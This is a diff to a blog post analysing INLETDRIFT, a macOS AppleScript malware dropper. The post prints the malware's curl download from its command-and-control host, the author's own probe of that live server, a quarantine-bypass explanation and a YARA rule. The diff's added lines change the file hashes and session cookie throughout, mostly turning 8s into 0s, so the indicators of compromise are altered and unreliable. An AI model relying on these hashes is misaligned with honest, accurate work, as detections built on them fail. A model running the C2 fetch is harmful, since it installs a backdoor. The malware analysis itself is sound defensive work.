@@ -14,7 +14,7 @@ permalink: /blog/inletdrift/
 - Multi-architecture <span class="glossary-term">universal binary</span> (x86_64 + ARM64)
 - Attributed to **UNC4736 / Citrine Sleet / AppleJeus** - a DPRK-aligned threat actor
 
-> **Sample Source**: This malware sample was obtained from [Objective-See's Malware Collection](https://github.com/objective-see/malware).
+**Sample Source**: This malware sample was obtained from [Objective-See's Malware Collection](https://github.com/objective-see/malware).
 ---
 
 ## Introduction
@@ -33,7 +33,7 @@ The sample analyzed (`Amber_OTC_RECEIPT.app`) is disguised as a financial docume
 ## Tools Used
 
 - **otool** - <span class="glossary-term">Mach-O</span> binary inspection and framework analysis
-- **codesign** - Code signature and <span class="glossary-term">notarization</span> verification  
+- **codesign** - Code signature and <span class="glossary-term">Notarization</span> verification  
 - **osadecompile** - AppleScript bytecode decompilation
 - **lldb** - Dynamic analysis and syscall tracing
 - **fswatch** - File system event monitoring
@@ -47,8 +47,8 @@ The sample analyzed (`Amber_OTC_RECEIPT.app`) is disguised as a financial docume
 |----------|-------|
 | **Filename** | `Amber_OTC_RECEIPT.app` |
 | **Bundle Identifier** | `com.atokyo.News` |
-| **SHA-256 (main.scpt)** | `e3f8abd86d91284c46cbafaf5838887b3d236caf64727dd86e975a589c471284` |
-| **MD5 (main.scpt)** | `ff15427d45b84e79b2e81199613841bb` |
+| **SHA-256 (main.scpt)** | `e3f8abd06d91204c46cbafaf5038807b3d236caf64727dd06e975a589c471284` |
+| **MD5 (main.scpt)** | `ff15427d45b84e79b2e81199613041bb` |
 | **Architecture** | Universal (x86_64 + ARM64) |
 | **Minimum macOS** | 10.6 (x86_64) |
 | **Code Signature** | Developer ID Application: Ruth Hall (AGN79H7MTU) |
@@ -148,7 +148,7 @@ com.apple.quarantine: 0083;696ebc49;Safari;D4466388-22ED-48A2-8D0A-B160810F9F0E
 
 > **Note**: This quarantine attribute is from the sample as downloaded from the Objective-See repository via Safari, demonstrating typical behavior for files obtained through a web browser.
 
-Because the application is **<span class="glossary-term">notarized</span>**, <span class="glossary-term">Gatekeeper</span> will still allow execution despite the <span class="glossary-term">quarantine</span> flag, the <span class="glossary-term">notarization</span> ticket overrides the typical "downloaded from the internet" warning.
+Because the application is **<span class="glossary-term">notarized</span>**, <span class="glossary-term">Gatekeeper</span> will still allow execution despite the <span class="glossary-term">quarantine</span> flag, the <span class="glossary-term">Notarization</span> ticket overrides the typical "downloaded from the internet" warning.
 
 ---
 
@@ -223,9 +223,9 @@ set theAtokyoPath to "/Users/" & (do shell script "whoami") & "/Library/Atokyo"
 do shell script "mkdir " & theAtokyoPath
 ```
 
-**Why `~/Library/`?**
+**Why `~/Library/` is ideal staging?**
 - Hidden by default in Finder (requires Cmd+Shift+. to view)
-- Not indexed by Spotlight
+- Results of searches are not shown in GUI by Spotlight
 - Writable without admin privileges
 - Blends with legitimate application data (Chrome, Slack, etc.)
 
@@ -266,7 +266,6 @@ This is the critical **Living-off-the-Land** transformation. The downloaded `Upd
 | Data file | Executable binary |
 | Cannot run | Can be executed |
 
-> [!IMPORTANT]
 > **Quarantine Bypass**: Files downloaded via `curl` in a script do NOT receive the `com.apple.quarantine` extended attribute. This allows the backdoor to execute without <span class="glossary-term">Gatekeeper</span> intervention, even on systems with strict security settings.
 
 ---
@@ -350,7 +349,7 @@ The first <span class="glossary-term">posix_spawn</span> hit reveals the malware
 ![LLDB capturing posix_spawn with liveness check command](./images/lldb_liveness_check.png)
 *Figure 2: LLDB memory examination showing the liveness check shell command*
 
-This matches the `<span class="glossary-term">do shell script</span>` call (via the `theFileExists()` function) in the decompiled AppleScript. The malware uses shell redirection to silently test for directory presence.
+This matches the <span class="glossary-term">do shell script</span> call (via the `theFileExists()` function) in the decompiled AppleScript. The malware uses shell redirection to silently test for directory presence.
 
 ---
 
@@ -360,7 +359,7 @@ The second <span class="glossary-term">posix_spawn</span> captures the full `cur
 
 ```lldb
 (lldb) x/s 0x6000021740a0
-0x6000021740a0: "curl 'https://atokyonews.com/CloudCheck.php?type=Update' --output /Users/hellomalware/Library/Atokyo/Update.tmp --cookie session=28293447382828474738374"
+0x6000021740a0: "curl 'https://atokyonews.com/CloudCheck.php?type=Update' --output /Users/hellomalware/Library/Atokyo/Update.tmp --cookie session=20293447382028474738374"
 ```
 
 | Parameter | Value |
@@ -368,7 +367,7 @@ The second <span class="glossary-term">posix_spawn</span> captures the full `cur
 | Method | GET (implicit) |
 | Target | `https://atokyonews.com/CloudCheck.php?type=Update` |
 | Output | `/Users/hellomalware/Library/Atokyo/Update.tmp` |
-| Cookie | `session=28293447382828474738374` |
+| Cookie | `session=20293447382028474738374` |
 
 ---
 
@@ -378,7 +377,7 @@ Manual testing of the C2 endpoint revealed active infrastructure:
 
 ```bash
 $ curl -v -k 'https://atokyonews.com/CloudCheck.php?type=Update' \
-    --cookie "session=28293447382828474738374"
+    --cookie "session=20293447382028474738374"
 ```
 
 **TLS Handshake Details:**
@@ -401,8 +400,8 @@ $ curl -v -k 'https://atokyonews.com/CloudCheck.php?type=Update' \
 | **Certificate CN** | `web-hosting.com` (mismatch!) |
 | **Hosting** | cPanel shared hosting |
 
-> [!WARNING]
-> **Certificate Mismatch**: The SSL certificate's Common Name (`web-hosting.com`) does not match the domain (`atokyonews.com`). This indicates the threat actors are using **shared/bulletproof hosting** where multiple domains share a single wildcard or default certificate.
+
+**Certificate Mismatch**: The SSL certificate's Common Name (`web-hosting.com`) does not match the domain (`atokyonews.com`). This indicates the threat actors are using **shared/bulletproof hosting** where multiple domains share a single wildcard or default certificate.
 
 ---
 
@@ -458,7 +457,7 @@ Each <span class="glossary-term">do shell script</span> command in AppleScript s
 | IP Address | `66.29.141.228` |
 | URL Path | `/CloudCheck.php?type=Update` |
 | URL Path | `/CloudCheck.php?type=News` |
-| Session Cookie | `session=28293447382828474738374` |
+| Session Cookie | `session=20293447382028474738374` |
 | Server | LiteSpeed (cPanel) |
 | TLS Cert CN | `web-hosting.com` (mismatch) |
 
@@ -474,8 +473,8 @@ Each <span class="glossary-term">do shell script</span> command in AppleScript s
 
 | Algorithm | Hash |
 |-----------|------|
-| SHA-256 (main.scpt) | `e3f8abd86d91284c46cbafaf5838887b3d236caf64727dd86e975a589c471284` |
-| MD5 (main.scpt) | `ff15427d45b84e79b2e81199613841bb` |
+| SHA-256 (main.scpt) | `e3f8abd06d91204c46cbafaf5038807b3d236caf64727dd06e975a589c471284` |
+| MD5 (main.scpt) | `ff15427d45b84e79b2e81199613041bb` |
 
 ---
 
@@ -506,7 +505,7 @@ rule INLETDRIFT_AppleScript_Dropper {
         author = "Prathamesh Walunj"
         description = "Detects INLETDRIFT AppleScript dropper used in Radiant Capital heist"
         reference = "https://github.com/objective-see/malware"
-        hash = "e3f8abd86d91284c46cbafaf5838887b3d236caf64727dd86e975a589c471284"
+        hash = "e3f8abd06d91204c46cbafaf5038807b3d236caf64727dd06e975a589c471284"
     
     strings:
         $s1 = "atokyonews" ascii
